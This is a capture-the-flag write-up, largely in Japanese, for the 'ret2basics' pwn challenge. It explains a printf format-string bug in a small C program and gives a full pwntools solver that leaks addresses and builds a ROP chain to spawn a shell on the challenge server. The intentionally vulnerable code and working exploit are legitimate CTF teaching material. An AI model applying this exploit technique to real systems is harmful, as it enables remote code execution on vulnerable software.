# ret2basics : Pwn

必要なのは基本だけ

Attachment  
[ret2basics.tar.gz](ret2basics.tar.gz)  

Difficulty Level : Very Hard  
Tags : Format String Bugs  
Author : tsune

# Solution

**問題概要**  
1回の入力で0x10バイトのデータを受け取り、printfで出力するコード。  
Format String Attackを利用し、`system('/bin/sh')`を実行してshellを起動することにより、flagを取得する問題。

**観察**  
```python
// gcc chal.c -o chal
#include <stdio.h>

char buf[0x10];
void vuln() {
    fgets(buf,sizeof(buf),stdin);
    printf(buf);
}

int main(void) {
    while(1) {
        vuln();
    }
}

__attribute__((constructor))
void setup() {
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
}
```
libcとlinkerが配布されていないため、Dockerから抜き出す。  
方法は以下の通り。
```
$ docker pull ubuntu:24.04@sha256:9cbed754112939e914291337b5e554b07ad7c392491dba6daf25eef1332a22e8
$ docker create ubuntu:24.04@sha256:9cbed754112939e914291337b5e554b07ad7c392491dba6daf25eef1332a22e8
($ docker ps -a)
$ docker cp <Container ID>:/lib/x86_64-linux-gnu/libc.so.6 .
$ docker cp <Container ID>:/lib64/ld-linux-x86-64.so.2 .
$ docker rm <Container ID>
```
gdbでデバッグするためにlibcとlinkerを指定する。
```
$ cp chal chal.bak
$ patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./chal
$ patchelf --set-rpath . ./chal
```
printfの直前にブレークポイントを設定して、そのときのスタックを確認する。スタックトップ(rsp)は、printfからのoffsetが6である。
```
pwndbg> b *vuln+53
Breakpoint 1 at 0x11be
...
pwndbg> tele 20
00:0000│ rbp rsp 0x7fffffffdba0 —▸ 0x7fffffffdbb0 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdcb0 ◂— 0
01:0008│+008     0x7fffffffdba8 —▸ 0x5555555551d8 (main+18) ◂— jmp 0x5555555551ce
02:0010│+010     0x7fffffffdbb0 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdcb0 ◂— 0
03:0018│+018     0x7fffffffdbb8 —▸ 0x7ffff7dd51ca ◂— mov edi, eax
04:0020│+020     0x7fffffffdbc0 —▸ 0x7fffffffdbf0 ◂— 1
05:0028│+028     0x7fffffffdbc8 —▸ 0x7fffffffdcd8 —▸ 0x7fffffffdf9a ◂— '/home/colza/ret2basics/chal'
06:0030│+030     0x7fffffffdbd0 ◂— 0x1f7faf5c0
07:0038│+038     0x7fffffffdbd8 —▸ 0x5555555551c6 (main) ◂— endbr64
08:0040│+040     0x7fffffffdbe0 —▸ 0x7fffffffdcd8 —▸ 0x7fffffffdf9a ◂— '/home/colza/ret2basics/chal'
09:0048│+048     0x7fffffffdbe8 ◂— 0x353cbde19f74e592
0a:0050│+050     0x7fffffffdbf0 ◂— 1
0b:0058│+058     0x7fffffffdbf8 ◂— 0
0c:0060│+060     0x7fffffffdc00 —▸ 0x555555557db0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555140 (__do_global_dtors_aux) ◂— endbr64
0d:0068│+068     0x7fffffffdc08 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
0e:0070│+070     0x7fffffffdc10 ◂— 0x353cbde19054e592
0f:0078│+078     0x7fffffffdc18 ◂— 0x353cada484d6e592
10:0080│+080     0x7fffffffdc20 ◂— 0x7fff00000000
11:0088│+088     0x7fffffffdc28 ◂— 0
12:0090│+090     0x7fffffffdc30 ◂— 0
13:0098│+098     0x7fffffffdc38 —▸ 0x555555557db0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555140 (__do_global_dtors_aux) ◂— endbr64
```
書き込みのできるbufがグローバル変数なので、printfからアクセスすることができない。

各offsetのリークから以下のアドレスが分かる。
* 6 : saved rbp → スタックのアドレス
* 7 : vuln return address → PIE base
* 9 : `__libc_start_main + 0x7a`のアドレス → libc base

format string bugを利用して書き込めるのは16バイトまでなので、アドレスの上書きは下位2バイトまでできる。また、bufが利用できないため、書き込み先はポインタのポインタとなる。  
例えば、return addressを上書きするとき、offset 6を利用して下位2バイトを0xdba8にすると、`0x7fffffffdbb0 —▸ 0x7fffffffdba8 —▸ 0x5555555551d8 (main+18)`のように繋げることができ、さらにアドレス0x7fffffffdbb0であるoffset 8を利用して下位2バイトを上書きすることで`0x7fffffffdba8 —▸ 0x55555555xxxx`とすることができる。  
このように、ポインタのポインタを、上書きしたいデータがあるアドレスに書き換えることで、任意書き込みを実現できる。  
上書きするときのformat stringは、`%<address_decimal>c%<offset>$hn`である。

mainのアドレスの下位2バイトのみを上書きしてstackに書き込んだROPを実行させるには、elfバイナリの中からretする命令片を探す必要がある。また、ROPをoffset 9以降に書き込んだ場合、vuln return addressとROPの間に邪魔なデータが存在するので、popして取り除く必要がある。
```
$ objdump -M intel -d chal | grep pop -A 1
    10a9:       5e                      pop    rsi
    10aa:       48 89 e2                mov    rdx,rsp
--
    1173:       5d                      pop    rbp
    1174:       c3                      ret
--
    11c4:       5d                      pop    rbp
    11c5:       c3                      ret
--
    120b:       5d                      pop    rbp
    120c:       c3                      ret
```
popとretがセットになっているROPガジェット(pop rbp; ret)を利用する。

**方針**  
dereferenceを利用して、ポインタのポインタに対して下位2バイトの上書きができるので、書き込みたいアドレスをdereferenceされるように上書きし、スタックに1バイトずつROPを書き込む。  
vlunからmainへのreturn addressの下位2バイトを上書きして、elfバイナリの中でretするアドレスに書き換えることで、スタックに書き込んだROPが実行されるようにする。  
任意書き込み方法は、任意のアドレスを繋ぐための上書き、繋いだアドレスを利用した任意の値の書き込み、の2段階構成である。

**手順**  
1. 各アドレスをリークする
2. ROP gadgetを組み合わせてROP chainを作り、1バイトずつスタックに書き込む
3. vuln return addressをelfバイナリ内の"pop rbp; ret"のアドレスに書き換える

**Solver**
```python solve.py
from pwn import *

elf = ELF('./chal')
libc = ELF('./libc.so.6')

context.binary = './chal'
context.arch = 'amd64'
# context.log_level = 'debug'

p = remote('34.170.146.252', 64123)

# leak __libc_start_main return
p.sendline(b"%9$p")
libc_leak = int(p.recvline().strip(), 16)
libc.address = libc_leak - libc.symbols['__libc_start_main'] + 54
log.info(f"libc_base: {hex(libc.address)}")

# leak stack address
p.sendline(b"%6$p")
stack_addr = int(p.recvline().strip(), 16)
log.info(f"stack_addr: {hex(stack_addr)}")

# pie base
p.sendline(b"%7$p")
main_leak = int(p.recvline().strip(), 16)
elf.address = main_leak - elf.symbols['main'] - 18
log.info(f"pie_base: {hex(elf.address)}")


elf_pop_rbp = next(elf.search(asm("pop rbp; ret"), executable=True))
pop_rdi = p64(next(libc.search(asm("pop rdi; ret"), executable=True)))
binsh_addr = p64(next(libc.search(b"/bin/sh\x00")))
system_addr = p64(libc.symbols['system'])
ret_addr = p64(next(libc.search(asm("ret"), executable=True)))


payload = pop_rdi + binsh_addr + ret_addr + system_addr
write_addr = stack_addr + 0x8
offset = 0
for i in payload:
    if i == 0:
        offset += 1
        continue
    p.sendline(f"%{(write_addr+offset) & 0xffff}c%6$hn")
    p.sendline(f"%{i}c%8$hhn")
    offset += 1

p.sendline(f"%{(stack_addr-0x8) & 0xffff}c%6$hn")
p.sendline(f"%{elf_pop_rbp & 0xffff}c%8$hn")

p.interactive()
```

**Exploitation**  
```
$ python3 solve.py
[*] '/home/colza/ret2basics/chal'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/colza/ret2basics/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to 34.170.146.252 on port 64123: Done
[*] libc_base: 0x7ff5d1d63000
[*] stack_addr: 0x7ffc568bf8f0
[*] pie_base: 0x56403fa6d000
...
$ ls
flag-93c4018b6fb9e0b102afa386931f0b44.txt
run
$ cat flag*
Alpaca{s1mple_15_7h3_b3st_2bf3bbb8}
```

Got the flag.

`Alpaca{s1mple_15_7h3_b3st_2bf3bbb8}`

# References
